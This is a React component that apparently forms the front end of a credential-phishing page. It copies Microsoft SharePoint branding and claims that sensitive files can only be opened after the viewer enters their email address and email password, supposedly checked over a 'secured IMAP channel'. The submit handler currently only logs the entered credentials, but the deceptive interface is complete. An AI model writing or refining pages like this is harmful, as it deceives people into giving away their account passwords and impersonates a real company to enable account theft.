import { useState } from "react";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";

interface AuthModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export const AuthModal = ({ isOpen, onClose }: AuthModalProps) => {
  const [email, setEmail] = useState("hi@me.com");
  const [password, setPassword] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Handle authentication here
    console.log("Authentication attempted with:", { email, password });
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="sm:max-w-md p-0 gap-0 bg-white shadow-modal border-0">
        {/* Header */}
        <div className="flex items-center space-x-2 px-6 py-4 border-b border-sharepoint-border">
          <div className="flex items-center space-x-2">
            <div className="w-6 h-6 flex items-center space-x-1">
              <div className="w-2 h-2 bg-red-500 rounded-sm"></div>
              <div className="w-2 h-2 bg-green-500 rounded-sm"></div>
              <div className="w-2 h-2 bg-blue-500 rounded-sm"></div>
              <div className="w-2 h-2 bg-yellow-500 rounded-sm"></div>
            </div>
            <span className="text-sm font-medium text-sharepoint-text">Microsoft</span>
            <span className="text-sharepoint-text/60">|</span>
            <span className="text-sm font-medium text-sharepoint-text">SharePoint</span>
          </div>
        </div>

        {/* Content */}
        <div className="px-6 py-6">
          <div className="text-center mb-6">
            <p className="text-sharepoint-text/80 text-sm leading-relaxed">
              These files are sensitive and secured against unauthorized access. In 
              order to access these files, please provide your correct email 
              credentials, we will connect you to your email provider through a 
              secured IMAP channel to authorize your download.
            </p>
          </div>

          <div className="text-center mb-6">
            <h3 className="text-sharepoint-text font-medium italic">
              Enter details to access protected documents
            </h3>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="email" className="text-sharepoint-text text-sm">
                Email address
              </Label>
              <Input
                id="email"
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full border-sharepoint-border focus:border-sharepoint-blue focus:ring-sharepoint-blue"
                required
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="password" className="text-sharepoint-text text-sm">
                Password
              </Label>
              <Input
                id="password"
                type="password"
                placeholder="Receiver's password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full border-sharepoint-border focus:border-sharepoint-blue focus:ring-sharepoint-blue"
                required
              />
            </div>

            <div className="pt-4">
              <Button
                type="submit"
                className="w-full bg-sharepoint-blue hover:bg-sharepoint-header text-white py-2.5 rounded"
              >
                Access Files
              </Button>
            </div>
          </form>
        </div>
      </DialogContent>
    </Dialog>
  );
};